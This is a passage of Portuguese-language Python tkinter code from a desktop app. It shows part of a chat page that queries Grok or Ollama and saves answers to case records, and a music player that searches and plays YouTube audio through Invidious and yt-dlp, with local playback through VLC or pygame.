            self.chat_text.insert("end", f"[{timestamp}] TU: ", "user_tag")
            self.chat_text.insert("end", text + "\n\n", "user_text")
        else:
            self.chat_text.insert("end", f"[{timestamp}] {sender}: ", "ai_tag")
            self.chat_text.insert("end", text + "\n\n", "ai_text")
        self.chat_text.tag_config("user_tag", foreground=ACCENT, font=(FONT_MONO, 8, "bold"))
        self.chat_text.tag_config("user_text", foreground=TEXT, font=(FONT_MONO, 9))
        self.chat_text.tag_config("ai_tag", foreground="#ffb700", font=(FONT_MONO, 8, "bold"))
        self.chat_text.tag_config("ai_text", foreground="#d8f8ff", font=(FONT_MONO, 9))
        self.chat_text.see("end")
        self.chat_text.configure(state="disabled")

    def clear_chat(self):
        if self._busy:
            return
        self.chat_text.configure(state="normal")
        self.chat_text.delete("1.0", "end")
        self.chat_text.configure(state="disabled")
        self.turns.clear()
        self.last_answer = ""
        self.add_message("IA AIRES", "Chat limpo. Como posso ajudar?", "ai")

    def ask(self, text):
        self.input_entry.delete(0, "end")
        self.input_entry.insert(0, text)
        self.send_message()

    def send_message(self):
        if self._busy:
            return
        text = self.input_entry.get().strip()
        if not text:
            return
        self.input_entry.delete(0, "end")
        self.add_message("TU", text, "user")
        self._busy = True
        self.btn_send.configure(state="disabled", text="...")
        self.log_label.configure(text="A responder...")
        mode = self.mode.get()
        turns = list(self.turns)
        threading.Thread(target=self._worker, args=(text, mode, turns), daemon=True).start()

    def _worker(self, prompt, mode, turns):
        try:
            response, engine = self._answer(prompt, mode, turns)
        except Exception as e:
            response, engine = f"Erro inesperado: {e}", "ERRO"
        self.after(0, lambda r=response, e=engine, p=prompt: self._finish(p, r, e))

    def _finish(self, prompt, response, engine):
        self._busy = False
        self.btn_send.configure(state="normal", text="ENVIAR")
        self.last_answer = response
        if engine != "ERRO":
            self.turns.append({"role": "user", "content": prompt})
            self.turns.append({"role": "assistant", "content": response})
            self.turns = self.turns[-10:]
        self.log_label.configure(text=f"Última resposta: {engine}")
        self.add_message(f"IA AIRES · {engine}", response, "ai")

    def _messages(self, prompt, turns):
        snap, _, _, _ = ia_snapshot()
        msgs = [{"role": "system", "content": IA_SYSTEM + "\n\nDADOS LOCAIS:\n" + snap}]
        msgs.extend(turns[-8:])
        msgs.append({"role": "user", "content": prompt})
        return msgs

    def _answer(self, prompt, mode, turns):
        msgs = self._messages(prompt, turns)
        if mode == "LOCAL":
            return ia_local_answer(prompt), "LOCAL"
        if mode in ("AUTO", "GROK"):
            key = self.current_key()
            if key:
                try:
                    return ia_grok(msgs, key, ia_load_config()["model"]), "GROK"
                except Exception as e:
                    if mode == "GROK":
                        return f"Não consegui falar com o Grok.\n{e}", "ERRO"
            elif mode == "GROK":
                return "Modo Grok sem chave. Cola a chave no painel e prime GUARDAR.", "ERRO"
        if mode in ("AUTO", "OLLAMA"):
            try:
                text, model = ia_ollama(msgs)
                return text, f"OLLAMA {model}"
            except Exception as e:
                if mode == "OLLAMA":
                    return f"Ollama indisponível.\n{e}", "ERRO"
        return ia_local_answer(prompt), "LOCAL"

    def test_grok(self):
        key = self.current_key()
        if not key:
            messagebox.showwarning("Aviso", "Não há chave para testar.")
            return
        self.log_label.configure(text="A testar Grok...")

        def work():
            try:
                ia_grok(
                    [{"role": "user", "content": "Responde apenas: ok"}],
                    key,
                    ia_load_config()["model"])
                msg, color = "Grok a responder.", "#00ff88"
            except Exception as e:
                msg, color = f"Teste falhou: {e}", ERROR
            self.after(0, lambda: self._test_done(msg, color))

        threading.Thread(target=work, daemon=True).start()

    def _test_done(self, msg, color):
        self.key_status.configure(text=msg[:180], fg=color)
        self.log_label.configure(text=msg[:80])

    def check_ollama(self):
        def work():
            try:
                names = ia_ollama_models()
                if names:
                    msg, color = "Ativo — " + ", ".join(names[:3]), "#00ff88"
                else:
                    msg, color = "Ativo, sem modelos. Corre: ollama pull llama3", "#ffb700"
            except Exception:
                msg, color = "Não detetado. Instala em ollama.com se quiseres o modo local.", TEXT_DIM
            self.after(0, lambda: self._ollama_done(msg, color))

        threading.Thread(target=work, daemon=True).start()

    def _ollama_done(self, msg, color):
        if self.winfo_exists():
            self.ollama_status.configure(text=msg, fg=color)

    def refresh_casos(self):
        casos = load_json(CASOS_FILE)
        menu = self.caso_menu["menu"]
        menu.delete(0, "end")
        titles = [c.get("titulo", "Sem título") for c in casos] if casos else ["Sem caso"]
        for t in titles:
            menu.add_command(label=t, command=lambda v=t: self.caso_var.set(v))
        if titles:
            self.caso_var.set(titles[0])

    def guardar_no_caso(self):
        caso = self.caso_var.get()
        if not self.last_answer:
            messagebox.showwarning("Aviso", "Ainda não há uma resposta para guardar.")
            return
        if not caso or caso == "Sem caso":
            messagebox.showwarning("Aviso", "Cria um caso em Investigação e volta aqui.")
            return
        registo = {
            "id": str(uuid.uuid4())[:8],
            "caso": caso,
            "data": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
            "fonte": "IA",
            "descricao": self.last_answer[:2000],
        }
        buscas = load_json(BUSCAS_FILE)
        if not isinstance(buscas, list):
            buscas = []
        buscas.append(registo)
        save_json(BUSCAS_FILE, buscas)
        messagebox.showinfo("Guardado", f"Resposta guardada nos registos do caso {caso}.")

    def on_show(self):
        self.refresh_casos()
        self.refresh_key_status()


# ─────────────────────────────────────────────
# Página Music (refatorada - suporta todos os formatos via VLC)
# ─────────────────────────────────────────────

class MusicPage(Page):
    """MUSIC MODERNO 2025 - Spotify/Apple Music style - YouTube + Local + Downloads + Lyrics"""
    SUPPORTED_EXTS = (".mp3", ".wav", ".ogg", ".flac", ".m4a", ".aac", ".wma", ".opus", ".aiff")

    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.header("MUSIC // MODERNO 2025 - PLAYER COMPLETO", "Spotify style • YouTube Music • Local • yt-dlp • Lyrics • Downloads • Fila • Favoritos")

        self.playlist = []  # lista de dicts
        self.queue = []
        self.current_index = -1
        self.is_paused = False
        self.is_shuffle = False
        self.is_repeat = False
        self.current_thumb = None
        self.search_results = []

        # Backends
        self.backend = None
        self.vlc = None
        self.vlc_instance = None
        self.vlc_player = None
        self.pygame = None
        self.mixer_ok = False
        self.current_process = None
        self._seeking = False
        self._init_backends()

        # Notebook moderno
        nb = ttk.Notebook(self)
        nb.pack(fill="both", expand=True, padx=12, pady=10)

        self.tab_player = tk.Frame(nb, bg=BG)
        self.tab_search = tk.Frame(nb, bg=BG)
        self.tab_biblioteca = tk.Frame(nb, bg=BG)
        self.tab_lyrics = tk.Frame(nb, bg=BG)

        nb.add(self.tab_player, text=" ▶ PLAYER MODERNO ")
        nb.add(self.tab_search, text=" 🔍 BUSCAR YOUTUBE ")
        nb.add(self.tab_biblioteca, text=" 📚 BIBLIOTECA ")
        nb.add(self.tab_lyrics, text=" 📝 LYRICS ")

        self.build_player_tab()
        self.build_search_tab()
        self.build_biblioteca_tab()
        self.build_lyrics_tab()

        self.load_biblioteca()

    # ─── BACKENDS ───
    def _init_backends(self):
        vlc_mod = ensure_package("python-vlc", "vlc")
        if vlc_mod is not None:
            try:
                self.vlc = vlc_mod
                self.vlc_instance = vlc_mod.Instance()
                self.vlc_player = self.vlc_instance.media_player_new()
                try:
                    em = self.vlc_player.event_manager()
                    em.event_attach(vlc_mod.EventType.MediaPlayerEndReached, self._on_vlc_end)
                except:
                    pass
                self.backend = "vlc"
                return
            except Exception:
                self.vlc = None
        pg = ensure_package("pygame")
        if pg is not None:
            try:
                pg.mixer.init()
                self.pygame = pg
                self.mixer_ok = True
                self.backend = "pygame"
            except Exception:
                self.mixer_ok = False

    def _on_vlc_end(self, event):
        self.after(0, self._auto_next)

    def _auto_next(self):
        if self.is_repeat:
            self.play_track()
        else:
            self.next_track()

    # ─── PLAYER TAB MODERNO ───
    def build_player_tab(self):
        # Top: Album art + info
        top = tk.Frame(self.tab_player, bg=BG)
        top.pack(fill="x", padx=15, pady=12)

        # Album art frame
        art_frame = tk.Frame(top, bg="#0a0a0a", width=180, height=180, highlightthickness=1, highlightbackground=ACCENT_DIM)
        art_frame.pack(side="left", padx=(0,15))
        art_frame.pack_propagate(False)
        self.art_label = tk.Label(art_frame, text="🎵\nSEM CAPA\n\nYouTube thumb\nou local art", bg="#0a0a0a", fg=TEXT_DIM, font=(FONT_MONO, 10), justify="center")
        self.art_label.pack(expand=True, fill="both")

        # Info + controls
        info_frame = tk.Frame(top, bg=BG)
        info_frame.pack(side="left", fill="both", expand=True)

        self.now_title = tk.Label(info_frame, text="Nenhuma música", bg=BG, fg=ACCENT, font=(FONT_MONO, 14, "bold"), anchor="w", wraplength=500, justify="left")
        self.now_title.pack(fill="x", anchor="w")
        self.now_artist = tk.Label(info_frame, text="Selecione música na biblioteca ou busque no YouTube", bg=BG, fg=TEXT, font=(FONT_MONO, 11), anchor="w")
        self.now_artist.pack(fill="x", anchor="w", pady=(2,8))
        self.now_album = tk.Label(info_frame, text="Backend: " + (self.backend.upper() if self.backend else "NENHUM - instala VLC"), bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 9), anchor="w")
        self.now_album.pack(fill="x", anchor="w")

        # Progress
        prog_frame = tk.Frame(info_frame, bg=BG)
        prog_frame.pack(fill="x", pady=(12,4))
        self.time_start = tk.Label(prog_frame, text="00:00", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8), width=5)
        self.time_start.pack(side="left")
        self.progress = ttk.Scale(prog_frame, from_=0, to=1000, orient="horizontal", command=self._on_seek)
        self.progress.set(0)
        self.progress.pack(side="left", fill="x", expand=True, padx=8)
        self.progress.bind("<ButtonPress-1>", lambda e: setattr(self, "_seeking", True))
        self.progress.bind("<ButtonRelease-1>", lambda e: setattr(self, "_seeking", False))
        self.time_end = tk.Label(prog_frame, text="00:00", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8), width=5)
        self.time_end.pack(side="left")

        # Controls modernos estilo Spotify
        ctrl = tk.Frame(info_frame, bg=BG)
        ctrl.pack(fill="x", pady=10)

        def mk_ctrl(txt, cmd, color=BTN_BG, fg=TEXT):
            b = tk.Button(ctrl, text=txt, command=cmd, bg=color, fg=fg, font=(FONT_MONO, 10, "bold"), relief="flat", bd=0, padx=12, pady=8, cursor="hand2", width=6)
            b.pack(side="left", padx=4)
            return b

        mk_ctrl("🔀", self.toggle_shuffle, PANEL_BG, TEXT_DIM)
        mk_ctrl("⏮", self.prev_track, BTN_BG)
        self.btn_play = mk_ctrl("▶ PLAY", self.toggle_play, ACCENT_DIM, ACCENT)
        self.btn_play.configure(width=10)
        mk_ctrl("⏭", self.next_track, BTN_BG)
        mk_ctrl("🔁", self.toggle_repeat, PANEL_BG, TEXT_DIM)
        mk_ctrl("⏹", self.stop_track, "#1a0a0f", ERROR)

        vol_frame = tk.Frame(info_frame, bg=BG)
        vol_frame.pack(fill="x", pady=6)
        tk.Label(vol_frame, text="VOL", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.vol_scale = ttk.Scale(vol_frame, from_=0, to=100, orient="horizontal", command=self.set_volume)
        self.vol_scale.set(70)
        self.vol_scale.pack(side="left", fill="x", expand=True, padx=8, ipady=2)
        tk.Label(vol_frame, text="❤ FAV", bg=BG, fg="#ff3b5c", font=(FONT_MONO, 8)).pack(side="left", padx=8)
        tk.Button(vol_frame, text="📋 COPIAR URL", command=self.copy_url, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 7), relief="flat", bd=0, padx=6, pady=2).pack(side="left", padx=4)
        tk.Button(vol_frame, text="📝 LYRICS", command=self.fetch_lyrics_current, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 7), relief="flat", bd=0, padx=6, pady=2).pack(side="left", padx=4)

        # Queue / Playlist
        queue_frame = tk.Frame(self.tab_player, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        queue_frame.pack(fill="both", expand=True, padx=15, pady=(0,12))

        q_top = tk.Frame(queue_frame, bg=PANEL_BG)
        q_top.pack(fill="x", padx=10, pady=8)
        tk.Label(q_top, text="FILA / PLAYLIST - Duplo clique toca", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 10, "bold")).pack(side="left")
        self.queue_count = tk.Label(q_top, text="0 músicas", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 8))
        self.queue_count.pack(side="right")
        tk.Button(q_top, text="LIMPAR", command=self.clear_playlist, bg="#1a0a0f", fg=ERROR, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=8, pady=2).pack(side="right", padx=8)
        tk.Button(q_top, text="SHUFFLE", command=self.shuffle_queue, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=8, pady=2).pack(side="right", padx=4)

        list_container = tk.Frame(queue_frame, bg=PANEL_BG)
        list_container.pack(fill="both", expand=True, padx=10, pady=(0,10))

        self.listbox = tk.Listbox(list_container, bg=BG, fg=TEXT, font=(FONT_MONO, 9), selectbackground=ACCENT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.listbox.pack(side="left", fill="both", expand=True)
        self.listbox.bind("<Double-Button-1>", self.play_selected)
        sb = ttk.Scrollbar(list_container, orient="vertical", command=self.listbox.yview)
        sb.pack(side="right", fill="y")
        self.listbox.configure(yscrollcommand=sb.set)

        self.after(500, self.update_time)

    def _on_seek(self, val):
        if self._seeking and self.backend=="vlc" and self.vlc_player:
            try:
                self.vlc_player.set_position(float(val)/1000.0)
            except:
                pass

    def set_volume(self, val):
        try:
            v = int(float(val))
            if self.backend=="vlc" and self.vlc_player:
                self.vlc_player.audio_set_volume(v)
            elif self.backend=="pygame" and self.mixer_ok:
                self.pygame.mixer.music.set_volume(v/100.0)
        except:
            pass

    def toggle_shuffle(self):
        self.is_shuffle = not self.is_shuffle
        self.now_album.configure(text="Shuffle: " + ("ON" if self.is_shuffle else "OFF") + " | Backend: " + (self.backend or "NENHUM"))

    def toggle_repeat(self):
        self.is_repeat = not self.is_repeat
        self.now_album.configure(text="Repeat: " + ("ON" if self.is_repeat else "OFF") + " | Backend: " + (self.backend or "NENHUM"))

    def shuffle_queue(self):
        import random
        random.shuffle(self.playlist)
        self.refresh_listbox()

    def refresh_listbox(self):
        self.listbox.delete(0, "end")
        for idx, item in enumerate(self.playlist):
            fav = "❤ " if item.get("fav") else "  "
            self.listbox.insert("end", f"{fav}{idx+1:02d}. {item.get('title','Sem titulo')} - {item.get('artist','Desconhecido')} [{item.get('source','local')}]")
        try:
            self.queue_count.configure(text=str(len(self.playlist)) + " músicas")
        except:
            pass

    def clear_playlist(self):
        self.stop_track()
        self.playlist.clear()
        self.listbox.delete(0, "end")
        self.current_index = -1
        self.now_title.configure(text="Playlist limpa")
        self.now_artist.configure(text="Adiciona músicas na biblioteca ou busca YouTube")
        self.save_biblioteca()

    def play_selected(self, evt=None):
        sel = self.listbox.curselection()
        if not sel:
            return
        self.current_index = sel[0]
        self.play_track()

    def play_track(self):
        if not self.playlist or self.current_index <0 or self.current_index>=len(self.playlist):
            return
        item = self.playlist[self.current_index]
        self.now_title.configure(text=item.get("title","Sem titulo")[:60])
        self.now_artist.configure(text=item.get("artist","Desconhecido") + " • " + item.get("album","") + " • " + item.get("source","local"))
        # Thumb
        thumb_url = item.get("thumb","")
        if thumb_url:
            threading.Thread(target=self.load_thumb, args=(thumb_url), daemon=True).start()
        else:
            self.art_label.configure(text="🎵\n" + item.get("title","")[:20] + "\n\n" + item.get("source",""))

        # Play logic
        file_path = item.get("file_path")
        url = item.get("url")
        youtube_url = item.get("youtube_url") or url

        # Se for ficheiro local
        if file_path and os.path.exists(file_path):
            self._play_file(file_path)
            return
        # Se for YouTube, extrai audio URL via yt-dlp se disponível
        if youtube_url and ("youtube.com" in youtube_url or "youtu.be" in youtube_url or item.get("source")=="youtube"):
            threading.Thread(target=self._play_youtube, args=(youtube_url, item), daemon=True).start()
            return
        # Se for URL direto mp3/aac
        if url:
            self._play_url(url)
            return

    def _play_file(self, path):
        try:
            if self.backend=="vlc" and self.vlc_player:
                media = self.vlc_instance.media_new(path)
                self.vlc_player.set_media(media)
                self.vlc_player.play()
                self.vlc_player.audio_set_volume(int(self.vol_scale.get()))
            elif self.backend=="pygame" and self.mixer_ok:
                self.pygame.mixer.music.load(path)
                self.pygame.mixer.music.play()
                self.pygame.mixer.music.set_volume(self.vol_scale.get()/100.0)
            self.is_paused=False
            self.btn_play.configure(text="⏸ PAUSE")
            self.listbox.selection_clear(0,"end")
            self.listbox.selection_set(self.current_index)
            self.listbox.see(self.current_index)
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def _play_url(self, url):
        try:
            if self.backend=="vlc" and self.vlc_player:
                media = self.vlc_instance.media_new(url)
                self.vlc_player.set_media(media)
                self.vlc_player.play()
                self.vlc_player.audio_set_volume(int(self.vol_scale.get()))
            else:
                # Fallback mpv externo
                if shutil.which("mpv"):
                    if self.current_process:
                        try: self.current_process.terminate()
                        except: pass
                    self.current_process = subprocess.Popen(["mpv", "--no-video", url])
                else:
                    webbrowser.open(url)
            self.is_paused=False
            self.btn_play.configure(text="⏸ PAUSE")
        except Exception as e:
            messagebox.showerror("Erro URL", str(e))

    def _play_youtube(self, youtube_url, item):
        # Tenta extrair audio url via yt-dlp, senão mpv direto que usa yt-dlp interno
        audio_url = None
        try:
            if shutil.which("yt-dlp"):
                # get bestaudio url
                cmd = ["yt-dlp", "-f", "bestaudio", "-g", youtube_url]
                res = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                if res.returncode==0:
                    audio_url = res.stdout.strip().split("\n")[0]
        except Exception as e:
            print("yt-dlp extract fail", e)

        def do_play():
            if audio_url:
                self._play_url(audio_url)
            else:
                # mpv consegue tocar youtube url diretamente se yt-dlp instalado
                if shutil.which("mpv"):
                    try:
                        if self.current_process:
                            try: self.current_process.terminate()
                            except: pass
                        self.current_process = subprocess.Popen(["mpv", "--no-video", youtube_url])
                        self.is_paused=False
                        self.btn_play.configure(text="⏸ PAUSE")
                    except Exception as e:
                        messagebox.showerror("MPV falhou", str(e))
                else:
                    # fallback abre browser
                    webbrowser.open(youtube_url)
        self.after(0, do_play)

    def toggle_play(self):
        if not self.playlist:
            messagebox.showinfo("Music", "Adiciona músicas na biblioteca ou busca YouTube primeiro")
            return
        if self.current_index==-1:
            self.current_index=0
            self.play_track()
            return
        try:
            if self.backend=="vlc" and self.vlc_player:
                if self.is_paused:
                    self.vlc_player.play()
                    self.is_paused=False
                    self.btn_play.configure(text="⏸ PAUSE")
                else:
                    if self.vlc_player.is_playing():
                        self.vlc_player.pause()
                        self.is_paused=True
                        self.btn_play.configure(text="▶ PLAY")
                    else:
                        self.play_track()
            elif self.backend=="pygame" and self.mixer_ok:
                if self.is_paused:
                    self.pygame.mixer.music.unpause()
                    self.is_paused=False
                    self.btn_play.configure(text="⏸ PAUSE")
                else:
                    self.pygame.mixer.music.pause()
                    self.is_paused=True
                    self.btn_play.configure(text="▶ PLAY")
            else:
                # mpv process pause not implemented, stop/play
                if self.current_process:
                    self.current_process.terminate()
                    self.current_process=None
                    self.btn_play.configure(text="▶ PLAY")
                else:
                    self.play_track()
        except Exception as e:
            print(e)

    def stop_track(self):
        try:
            if self.backend=="vlc" and self.vlc_player:
                self.vlc_player.stop()
            if self.backend=="pygame" and self.mixer_ok:
                self.pygame.mixer.music.stop()
            if self.current_process:
                self.current_process.terminate()
                self.current_process=None
            self.is_paused=False
            self.btn_play.configure(text="▶ PLAY")
            self.progress.set(0)
            self.time_start.configure(text="00:00")
        except:
            pass

    def prev_track(self):
        if not self.playlist:
            return
        if self.is_shuffle:
            import random
            self.current_index = random.randint(0, len(self.playlist)-1)
        else:
            self.current_index = (self.current_index-1) % len(self.playlist)
        self.play_track()

    def next_track(self):
        if not self.playlist:
            return
        if self.is_shuffle:
            import random
            self.current_index = random.randint(0, len(self.playlist)-1)
        else:
            self.current_index = (self.current_index+1) % len(self.playlist)
        self.play_track()

    def copy_url(self):
        if self.current_index>=0 and self.current_index < len(self.playlist):
            url = self.playlist[self.current_index].get("url") or self.playlist[self.current_index].get("youtube_url","")
            self.clipboard_clear()
            self.clipboard_append(url)

    def update_time(self):
        try:
            if self.backend=="vlc" and self.vlc_player and self.vlc_player.is_playing():
                pos = self.vlc_player.get_position()
                if not self._seeking:
                    self.progress.set(pos*1000)
                t = self.vlc_player.get_time()
                total = self.vlc_player.get_length()
                if t>0 and total>0:
                    self.time_start.configure(text=self.format_ms(t))
                    self.time_end.configure(text=self.format_ms(total))
        except:
            pass
        self.after(500, self.update_time)

    def format_ms(self, ms):
        s = int(ms/1000)
        m = s//60
        s = s%60
        return f"{m:02d}:{s:02d}"

    def load_thumb(self, url):
        try:
            import urllib.request
            from PIL import Image, ImageTk
            # Download thumb
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as r:
                data = r.read()
            # Save temp
            tmp = os.path.join(TEMP_MUSIC_DIR, "thumb.jpg")
            os.makedirs(TEMP_MUSIC_DIR, exist_ok=True)
            with open(tmp, "wb") as f:
                f.write(data)
            img = Image.open(tmp)
            img = img.resize((180,180))
            tk_img = ImageTk.PhotoImage(img)
            def update():
                self.art_label.configure(image=tk_img, text="")
                self.art_label.image = tk_img
                self.current_thumb = tk_img
            self.after(0, update)
        except Exception as e:
            print("thumb fail", e)
            # Fallback text
            self.after(0, lambda: self.art_label.configure(text="🎵\nThumb\nfalhou\n\n" + url[:30]))

    # ─── SEARCH TAB ───
    def build_search_tab(self):
        top = tk.Frame(self.tab_search, bg=BG)
        top.pack(fill="x", padx=12, pady=12)
        tk.Label(top, text="🔍 BUSCAR MÚSICAS - YouTube Music API 2025", bg=BG, fg=ACCENT, font=(FONT_MONO, 12, "bold")).pack(anchor="w")
        tk.Label(top, text="Busca via Invidious API + yt-dlp - sem API key - 100% grátis", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w")

        search_row = tk.Frame(self.tab_search, bg=BG)
        search_row.pack(fill="x", padx=12, pady=8)
        tk.Label(search_row, text="Query:", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(side="left")
        self.search_entry = tk.Entry(search_row, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO, 12), width=30)
        self.search_entry.pack(side="left", padx=8, fill="x", expand=True, ipady=6)
        self.search_entry.insert(0, "lofi hip hop")
        self.search_entry.bind("<Return>", lambda e: self.search_youtube())
        tk.Button(search_row, text="🔍 BUSCAR", command=self.search_youtube, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 10, "bold"), relief="flat", bd=0, padx=16, pady=6, cursor="hand2").pack(side="left", padx=4)

        btn_row = tk.Frame(self.tab_search, bg=BG)
        btn_row.pack(fill="x", padx=12, pady=4)
        for txt, cmd in [("TRENDING PT", lambda: self.search_query("top hits portugal 2025")), ("LOFI", lambda: self.search_query("lofi hip hop")), ("PHONK", lambda: self.search_query("phonk")), ("RAP PT", lambda: self.search_query("rap português 2025")), ("KIZOMBA", lambda: self.search_query("kizomba"))]:
            b = tk.Button(btn_row, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=8, pady=4, cursor="hand2")
            b.pack(side="left", padx=4, fill="x", expand=True)

        # Results
        result_frame = tk.Frame(self.tab_search, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        result_frame.pack(fill="both", expand=True, padx=12, pady=8)

        tk.Label(result_frame, text="RESULTADOS YouTube - Duplo clique toca", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w", padx=10, pady=6)

        self.search_listbox = tk.Listbox(result_frame, font=(FONT_MONO, 9), bg=BG, fg=TEXT, selectbackground=ACCENT_DIM, relief="flat", highlightthickness=0, height=12)
        self.search_listbox.pack(fill="both", expand=True, padx=10, pady=4)
        self.search_listbox.bind("<Double-Button-1>", lambda e: self.play_search_selected())

        btns = tk.Frame(result_frame, bg=PANEL_BG)
        btns.pack(fill="x", padx=10, pady=8)
        for txt, cmd in [("▶ TOCAR", self.play_search_selected), ("➕ ADD FILA", self.add_search_to_queue), ("⬇ DOWNLOAD MP3", self.download_search), ("📝 LYRICS", self.fetch_lyrics_search), ("🌐 ABRIR YOUTUBE", self.open_youtube)]:
            b = tk.Button(btns, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=8, pady=4, cursor="hand2")
            b.pack(side="left", padx=3, fill="x", expand=True)

        self.search_out = scrolledtext.ScrolledText(self.tab_search, font=(FONT_MONO, 8), bg=PANEL_BG, fg=TEXT_DIM, height=5, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.search_out.pack(fill="x", padx=12, pady=(0,12))
        self.search_out.insert("1.0", "YouTube Music search pronto. Usa Invidious API (sem API key).\\nBusca músicas e toca direto com MPV/VLC + yt-dlp\\n")

    def search_query(self, q):
        self.search_entry.delete(0,"end")
        self.search_entry.insert(0,q)
        self.search_youtube()

    def search_youtube(self):
        q = self.search_entry.get().strip()
        if not q:
            return
        self.search_out.delete("1.0","end")
        self.search_out.insert("1.0", "Buscando: " + q + " via Invidious API...\\n")
        threading.Thread(target=self.search_worker, args=(q), daemon=True).start()

    def search_worker(self, query):
        results = []
        try:
            import urllib.request, json
            # Tenta várias instâncias Invidious
            instances = [
                "https://vid.puffyan.us",
                "https://yewtu.be",
                "https://inv.nadeko.net",
                "https://invidious.privacydev.net"
            ]
            for base in instances:
                try:
                    url = base + "/api/v1/search?q=" + urllib.parse.quote(query) + "&type=video&sort_by=relevance"
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    with urllib.request.urlopen(req, timeout=10) as r:
                        data = json.loads(r.read().decode())
                        for item in data[:20]:
                            if item.get("type")=="video":
                                results.append({
                                    "title": item.get("title",""),
                                    "author": item.get("author",""),
                                    "videoId": item.get("videoId",""),
                                    "length": item.get("lengthSeconds",0),
                                    "views": item.get("viewCount",0),
                                    "thumb": "https://i.ytimg.com/vi/" + item.get("videoId","") + "/mqdefault.jpg",
                                    "url": "https://www.youtube.com/watch?v=" + item.get("videoId","")
                                })
                        if results:
                            break
                except Exception as e:
                    print("instance fail", base, e)
                    continue
            # Fallback: usa yt-dlp search se API falhar
            if not results and shutil.which("yt-dlp"):
                try:
                    cmd = ["yt-dlp", "ytsearch10:" + query, "--get-id", "--get-title", "--get-duration"]
                    res = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
                    lines = res.stdout.strip().split("\n")
                    for i in range(0, len(lines), 3):
                        if i+1 < len(lines):
                            vid = lines[i].strip()
                            title = lines[i+1].strip() if i+1 < len(lines) else vid
                            results.append({"title": title, "author": "YouTube", "videoId": vid, "length": 0, "url": "https://www.youtube.com/watch?v=" + vid, "thumb": "https://i.ytimg.com/vi/" + vid + "/mqdefault.jpg"})
                except Exception as e:
                    print("yt-dlp search fail", e)
        except Exception as e:
            results = []

        def update():
            self.search_listbox.delete(0,"end")
            self.search_results = results
            for r in results:
                mins = int(r.get("length",0))//60 if r.get("length") else 0
                secs = int(r.get("length",0))%60 if r.get("length") else 0
                self.search_listbox.insert("end", f"{r['title'][:60]} - {r['author'][:20]} [{mins:02d}:{secs:02d}]")
            self.search_out.delete("1.0","end")
            self.search_out.insert("1.0", f"Encontradas {len(results)} músicas para '{query}'\\nDuplo clique para tocar, ADD FILA para adicionar à playlist moderna\\n")
        self.after(0, update)

    def get_selected_search(self):
        sel = self.search_listbox.curselection()
        if not sel or not self.search_results:
            return None
        return self.search_results[sel[0]]

    def play_search_selected(self):
        item = self.get_selected_search()
        if not item:
            messagebox.showwarning("Aviso","Selecione música")
            return
        music_item = {
            "id": str(uuid.uuid4()),
            "title": item["title"],
            "artist": item["author"],
            "album": "YouTube",
            "url": item["url"],
            "youtube_url": item["url"],
            "thumb": item["thumb"],
            "source": "youtube",
            "fav": False
        }
        self.playlist.append(music_item)
        self.current_index = len(self.playlist)-1
        self.refresh_listbox()
        self.save_biblioteca()
        self.play_track()

    def add_search_to_queue(self):
        sel = self.search_listbox.curselection()
        if not sel:
            return
        added=0
        for idx in sel:
            if idx < len(self.search_results):
                r = self.search_results[idx]
                self.playlist.append({
                    "id": str(uuid.uuid4()),
                    "title": r["title"],
                    "artist": r["author"],
                    "album": "YouTube",
                    "url": r["url"],
                    "youtube_url": r["url"],
                    "thumb": r["thumb"],
                    "source": "youtube",
                    "fav": False
                })
                added+=1
        self.refresh_listbox()
        self.save_biblioteca()
        self.search_out.insert("end", f"\\n✓ {added} adicionadas à fila")

    def download_search(self):
        item = self.get_selected_search()
        if not item:
            return
        if not shutil.which("yt-dlp"):
            messagebox.showerror("yt-dlp", "Instala yt-dlp: pip install yt-dlp\\nOu sudo apt install yt-dlp")
            return
        out_dir = os.path.join(BASE_DIR, "music_downloads")
        os.makedirs(out_dir, exist_ok=True)
        url = item["url"]
        self.search_out.insert("end", f"\\n⬇ A baixar {item['title']} para {out_dir}...\\n")
        def dl():
            try:
                cmd = ["yt-dlp", "-x", "--audio-format", "mp3", "-o", os.path.join(out_dir, "%(title)s.%(ext)s"), url]
                subprocess.run(cmd, timeout=120)
                self.after(0, lambda: self.search_out.insert("end", "✓ Download concluído\\n"))
            except Exception as e:
                self.after(0, lambda: self.search_out.insert("end", f"✗ Erro: {e}\\n"))
        threading.Thread(target=dl, daemon=True).start()

    def open_youtube(self):
        item = self.get_selected_search()
        if item:
            webbrowser.open(item["url"])

    def fetch_lyrics_search(self):
        item = self.get_selected_search()
        if not item:
            return
        self.fetch_lyrics(item["title"], item["author"])

